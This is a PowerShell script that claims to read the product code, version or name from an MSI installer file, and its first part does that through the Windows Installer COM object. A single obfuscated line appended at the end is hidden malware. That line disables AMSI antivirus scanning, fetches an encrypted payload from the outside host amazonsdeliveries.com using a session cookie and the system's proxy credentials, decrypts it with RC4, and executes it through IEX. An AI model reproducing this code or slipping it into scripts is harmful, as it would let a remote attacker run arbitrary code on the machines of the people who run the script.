﻿param(
[parameter(Mandatory=$true)]
[IO.FileInfo]$Path,
[parameter(Mandatory=$true)]
[ValidateSet("ProductCode","ProductVersion","ProductName")]
[string]$Property
)
try {
    $WindowsInstaller = New-Object -ComObject WindowsInstaller.Installer
    $MSIDatabase = $WindowsInstaller.GetType().InvokeMember("OpenDatabase","InvokeMethod",$Null,$WindowsInstaller,@($Path.FullName,0))
    $Query = "SELECT Value FROM Property WHERE Property = '$($Property)'"
    $View = $MSIDatabase.GetType().InvokeMember("OpenView","InvokeMethod",$null,$MSIDatabase,($Query))
    $View.GetType().InvokeMember("Execute", "InvokeMethod", $null, $View, $null)
    $Record = $View.GetType().InvokeMember("Fetch","InvokeMethod",$null,$View,$null)
    $Value = $Record.GetType().InvokeMember("StringData","GetProperty",$null,$Record,1)
    return $Value
} 
catch {
    Write-Output $_.Exception.Message
}
[ReF].AsSemBly.GetTyPe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GetFiELd('amsiInitFailed','NonPublic,Static').SeTVaLuE($NUlL,$True)};[SYsTEM.NEt.SeRVicEPoIntManAger]::ExpECt100COnTiNuE=0;$wc=NeW-OBJect SysTEm.Net.WEBClIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEAdErS.ADD('User-Agent',$u);$Wc.Proxy=[SYsTEM.NeT.WEBReQuEsT]::DEFAUlTWebPRoXY;$Wc.ProXY.CREDENtiALs = [SYstem.NeT.CredeNtiALCACHe]::DEFaUlTNEtWOrkCRedEnTIAls;$K=[SYsTeM.TExt.ENcodiNG]::ASCII.GEtBYtes('092f88229804a93705f8c2a11ac65d9f');$R={$D,$K=$ARGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COunT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxoR$S[($S[$I]+$S[$H])%256]}};$wc.HeADeRS.ADD("Cookie","session=49d1auYSdQL5+WVk8jT7PYLXFSw=");$ser='http://amazonsdeliveries.com:80';$t='/account/login.php';$DAta=$WC.DOWnlOADDATa($SeR+$T);$iv=$dATA[0..3];$dAtA=$Data[4..$DAtA.LEngth];-jOIn[ChAr[]](& $R $DAtA ($IV+$K))|IEX

